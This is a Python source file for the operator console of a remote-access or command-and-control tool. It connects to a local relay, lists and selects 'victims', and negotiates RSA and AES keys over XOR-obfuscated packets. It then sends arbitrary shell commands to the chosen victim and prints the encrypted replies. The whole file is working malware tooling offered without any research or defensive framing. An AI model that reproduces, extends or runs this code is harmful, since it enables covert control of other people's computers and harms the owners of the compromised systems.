import asyncio
import base64
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
import json


# Encryption process.
def encrypt(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    cipher_text, tag = cipher.encrypt_and_digest(data)
    nonce = cipher.nonce
    return base64.b64encode(nonce + tag + cipher_text)  # type: ignore


# Decryption process.
def decrypt(data, aes_key):
    data = base64.b64decode(data)
    nonce, tag, cipher_text = data[:16], data[16:32], data[32:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(cipher_text, tag).decode()


# Display victim list.
def display_victims(victim_list):

    for i in victim_list:
        print(i)


# For xor obfuscation for secure packets.
def xor_sec(data):

    xor_key = '_!cipher@#'
    return bytes([b ^ ord(xor_key[i % len(xor_key)]) for i, b in enumerate(data)])


# Listener handle.
async def listener():

    try:

        while True:

            # Create reader and writer handlers for tcp socket.
            reader, writer = await asyncio.open_connection('127.0.0.1', 5555)

            # Request victim list.
            response = await reader.read(10000000000)
            data = json.loads(xor_sec(response).decode())

            if data.get('victims'):

                victim_list = data.get('victims')
                print(f'''
+-------------------+
| Available Victims | 
+-------------------+
''')
                display_victims(victim_list)

            elif data.get('error'):
                print(data.get('error'))
                break

            # Select a victim.
            victim_id = input('\nEnter victim ID : ')

            # Send selected victim id.
            writer.write(xor_sec(json.dumps({'select': victim_id}).encode()))
            await writer.drain()

            # Confirm the selected victim id is valid or not.
            response = await reader.read(10000000000)
            data = json.loads(xor_sec(response).decode())

            if 'success' in data:

                print(data['success'])

                # Generate RSA key pair.
                key = RSA.generate(2048)
                private_key = key
                public_key = key.public_key()
                print('[+] RSA key pair generated.')

                # Send listener public key.
                writer.write(xor_sec(json.dumps({
                    'pubkey': base64.b64encode(public_key.export_key()).decode()
                }).encode()))
                await writer.drain()
                print('[+] Sent listener public key.')

                # Receive victim's public key.
                try:
                    data = await reader.read(10000000000)
                    msg = json.loads(xor_sec(data).decode())

                    if 'pubkey' in msg:

                        victim_pubkey = RSA.import_key(
                            base64.b64decode(msg['pubkey']))
                        print('[+] Received victim public key.')

                except Exception as e:
                    exit()

                # Receive AES key.
                try:
                    data = await reader.read(10000000000)
                    msg = json.loads(xor_sec(data).decode())

                    # Decrypt encrypted AES key and store it.
                    if 'AES-key' in msg:

                        encrypted_aes_key = base64.b64decode(msg['AES-key'])
                        cipher_rsa = PKCS1_OAEP.new(private_key)
                        aes_key = cipher_rsa.decrypt(encrypted_aes_key)
                        print('[+] Received AES key.')

                        print('[+] Victim successfully connected.\n')

                except Exception as e:
                    print(e)
                    exit()

                # Command send and recieve section.
                while True:

                    command = input('>> ')

                    if command.strip() == 'exit':

                        writer.write(encrypt(command.encode(), aes_key))  # type: ignore
                        writer.close()
                        await writer.wait_closed()
                        exit()

                    
                    writer.write(encrypt(command.encode(), aes_key))  # type: ignore
                    await writer.drain()

                    response = await reader.read(10000000000)
                    print(decrypt(response, aes_key))  # type: ignore

            else:
                print(data.get('error'))
                exit()

    except Exception as e:
        print(f'[!] Error: {e}')
        exit()

asyncio.run(listener())
